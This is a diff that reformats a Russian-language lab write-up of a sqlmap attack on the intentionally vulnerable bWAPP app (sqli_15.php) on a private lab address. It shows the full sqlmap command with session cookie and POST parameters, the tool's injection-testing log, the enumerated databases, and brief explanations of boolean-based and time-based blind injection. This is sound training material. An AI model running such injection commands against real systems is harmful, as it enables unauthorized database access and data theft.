@@ -9,26 +9,20 @@ sidebar_position: 1
 
 
 Запрос в sqlmap
-
+```bash
 ┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://192.168.42.132/bWAPP/sqli_15.php --cookie="PHPSESSID=c1e4694294baea16261ef0e4052e5bbd; security_level=0" --data="title=Iron+Man&action=search" -p title --dbs
 
-└─$ sqlmap -u http://192.168.42.132/bWAPP/sqli\_15.php --cookie="PHPSESSID=c1e4694294baea16261ef0e4052e5bbd; security\_level=0" --data="title=Iron+Man&action=search" -p title --dbs
-
-\_\_\_
-
-\_\_H\_\_
-
-\_\_\_ \_\_\_[(]\_\_\_\_\_ \_\_\_ \_\_\_ \{1.9.10#stable\}
-
-|\_ -| . [.] | .'| . |
-
-|\_\_\_|\_ [(]\_|\_|\_|\_\_,| \_|
-
-|\_|V... |\_| https://sqlmap.org
+        ___
+       __H__
+ ___ ___["]_____ ___ ___ {1.9.10#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_| https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. **Developers** assume no liability and are not responsible for any misuse or damage caused by this program
 
-[\*] starting @ 02:06:32 /2025-11-13/
+[*] starting @ 02:06:32 /2025-11-13/
 
 [02:06:32] [INFO] testing connection to the target URL
 
@@ -64,7 +58,7 @@ sidebar_position: 1
 
 [02:06:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
 
-[02:06:33] [INFO] testing 'Oracle stacked queries (DBMS\_PIPE.RECEIVE\_MESSAGE - comment)'
+[02:06:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
 
 [02:06:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
 
@@ -120,7 +114,7 @@ do you want sqlmap to try to optimize value(s) for DBMS delay responses (option 
 
 [02:09:07] [INFO] adjusting time delay to 1 second due to good response times
 
-information\_schema
+information_schema
 
 [02:10:05] [INFO] retrieved: bWAPP
 
@@ -130,24 +124,23 @@ information\_schema
 
 available databases [4]:
 
-[\*] bWAPP
+[*] bWAPP
 
-[\*] drupageddon
+[*] drupageddon
 
-[\*] information\_schema
+[*] information_schema
 
-[\*] mysql
+[*] mysql
 
 [02:11:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.42.132'
 
-[\*] ending @ 02:11:18 /2025-11-13/
+[*] ending @ 02:11:18 /2025-11-13/
 
 ┌──(kali㉿kali)-[~]
-
 └─$
-
-Logfile
-
+```
+**Logfile**
+```bash
 sqlmap identified the following injection point(s) with a total of 2252 HTTP(s) requests:
 
 ---
@@ -176,13 +169,10 @@ back-end DBMS: **MySQL** >= 5.0.12
 
 available databases [4]:
 
-[\*] bWAPP
-
-[\*] drupageddon
-
-[\*] information\_schema
-
-[\*] mysql
+[*] bWAPP
+[*] drupageddon
+[*] information_schema
+[*] mysql
 
 sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
 
@@ -206,14 +196,11 @@ back-end DBMS: **MySQL** >= 5.0.12
 
 available databases [4]:
 
-[\*] bWAPP
-
-[\*] drupageddon
-
-[\*] information\_schema
-
-[\*] mysql
-
+[*] bWAPP
+[*] drupageddon
+[*] information_schema
+[*] mysql
+```
 **Boolean-based:** Приложение меняет свой ответ в зависимости от того, истинно условие в запросе или ложно. Это позволяет извлекать данные, анализируя изменения на странице.
 
 **Time-based:** База данных успешно выполнила команду SLEEP(5), из-за чего ответ сервера пришел с задержкой. Это подтверждает возможность исполнения произвольного SQL-кода.
